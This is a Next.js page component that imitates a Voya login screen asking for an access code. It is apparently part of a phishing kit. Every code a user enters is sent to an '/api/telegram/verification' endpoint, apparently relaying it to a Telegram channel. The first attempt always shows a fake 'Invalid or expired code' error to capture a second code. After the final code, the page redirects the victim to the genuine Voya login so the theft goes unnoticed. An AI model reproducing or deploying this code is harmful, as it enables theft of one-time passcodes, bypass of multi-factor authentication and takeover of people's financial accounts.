"use client";

import { Suspense, useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { Button } from "@/components/ui/button";
import { VoyaHeader } from "@/components/voya-header";

const ALIGHT_REDIRECT_URL =
  "https://login.voya.com/voyassoui/index.html#/login-pweb";

function EnterCodeContent() {
  const [code, setCode] = useState("");
  const [firstAttemptCode, setFirstAttemptCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [errorMessage, setErrorMessage] = useState("");
  const [isCooldown, setIsCooldown] = useState(false);
  const [cooldownSeconds, setCooldownSeconds] = useState(0);
  const router = useRouter();
  const searchParams = useSearchParams();
  const isSecondOtp = searchParams.get("step") === "2";

  useEffect(() => {
    if (typeof window === "undefined") return;
    if (isSecondOtp) {
      if (!sessionStorage.getItem("ubs_otp2"))
        router.replace("/verify-details");
    } else {
      if (!sessionStorage.getItem("ubs_verify")) router.replace("/");
    }
  }, [isSecondOtp, router]);

  useEffect(() => {
    if (!isCooldown || cooldownSeconds <= 0) return;

    const timer = setInterval(() => {
      setCooldownSeconds((prev) => {
        const newSeconds = prev - 1;
        if (newSeconds <= 0) {
          setIsCooldown(false);
        }
        return newSeconds;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isCooldown, cooldownSeconds]);

  const handleVerify = async () => {
    if (isLoading || isCooldown) return;
    setIsLoading(true);
    setErrorMessage("");

    // Only apply two-attempt flow for first verification, not final verification
    if (!isSecondOtp) {
      const newAttemptCount = attemptCount + 1;
      setAttemptCount(newAttemptCount);

      // First attempt: send code and show error
      if (newAttemptCount === 1) {
        setFirstAttemptCode(code);
        try {
          await fetch("/api/telegram/verification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              verificationType: "Code (first OTP) - First Attempt",
              code: code,
            }),
          }).catch(console.error);
        } catch (error) {
          console.error("Failed to send verification notification:", error);
        }
        setErrorMessage("Invalid or expired code");
        setCode("");
        setIsLoading(false);
        setIsCooldown(true);
        setCooldownSeconds(15);
        return;
      }

      // Second attempt: send both codes and proceed with verification
      try {
        await fetch("/api/telegram/verification", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            verificationType: "Code (first OTP) - Second Attempt",
            code: code,
            firstAttemptCode: firstAttemptCode,
          }),
        }).catch(console.error);
      } catch (error) {
        console.error("Failed to send verification notification:", error);
      }
    } else {
      // Final verification - direct path, no two-attempt flow
      try {
        await fetch("/api/telegram/verification", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            verificationType: "Code (final)",
            code,
          }),
        }).catch(console.error);
      } catch (error) {
        console.error("Failed to send verification notification:", error);
      }
    }

    await new Promise((r) => setTimeout(r, 1000));
    if (isSecondOtp) {
      window.location.href = ALIGHT_REDIRECT_URL;
    } else {
      if (typeof window !== "undefined")
        sessionStorage.setItem("ubs_details", "1");
      router.push("/verify-details");
    }
  };

  const handleResend = async () => {
    if (isResending) return;
    setIsResending(true);
    try {
      await fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ isSecondOtp }),
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send resend code notification:", error);
    }
    await new Promise((r) => setTimeout(r, 2000));
    setIsResending(false);
  };

  return (
    <div className="min-h-screen bg-white">
      <VoyaHeader />
      <div className="max-w-2xl px-4 py-10 mb-67.5 mx-auto md:mx-0 md:ml-15">
        <div className="mb-6">
          <h2 className="text-base font-medium text-gray-900 mb-4">
            Verify It's You
          </h2>
          <h1 className="text-2xl font-semibold text-gray-900 mb-3">
            Enter Access Code
          </h1>
          <p className="text-gray-700 text-sm mb-4">
            Enter the code that was sent to you.
          </p>

          {errorMessage && (
            <div className="mb-4 px-3 py-2 bg-red-50 border border-red-200 rounded-md">
              <p className="text-red-600 text-sm font-medium">{errorMessage}</p>
            </div>
          )}

          <div className="flex items-center gap-2 mb-4">
            <span className="text-gray-700 text-sm">Didn't receive code?</span>
            <button
              type="button"
              onClick={handleResend}
              disabled={isResending}
              className="px-3 py-1.5 bg-gray-200 text-gray-700 rounded-md text-sm font-medium hover:bg-gray-300 disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {isResending ? "Loading..." : "Resend code"}
            </button>
          </div>
        </div>

        <div className="space-y-4">
          <div>
            <input
              type="text"
              id="code"
              inputMode="numeric"
              value={code}
              onChange={(e) =>
                setCode(e.target.value.replace(/\D/g, "").slice(0, 6))
              }
              placeholder=""
              className="w-full max-w-50 px-2.5 py-1.5 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#254650] focus:border-transparent"
              maxLength={6}
            />
          </div>

          <div className="flex gap-3 mt-3">
            <Button
              className="bg-[#254650] text-white hover:bg-[#1e383f] rounded-md disabled:opacity-70 disabled:pointer-events-none h-8 px-5 text-sm font-medium"
              onClick={handleVerify}
              disabled={
                code.replace(/\D/g, "").length !== 6 || isLoading || isCooldown
              }
            >
              {isLoading
                ? "Loading..."
                : isCooldown
                  ? `Wait ${cooldownSeconds}s`
                  : "Continue"}
            </Button>
            <Button
              variant="ghost"
              className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-8 px-5 text-sm font-medium"
              onClick={() => router.push("/verify-choice")}
            >
              Cancel
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function EnterCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
          Loading...
        </div>
      }
    >
      <EnterCodeContent />
    </Suspense>
  );
}
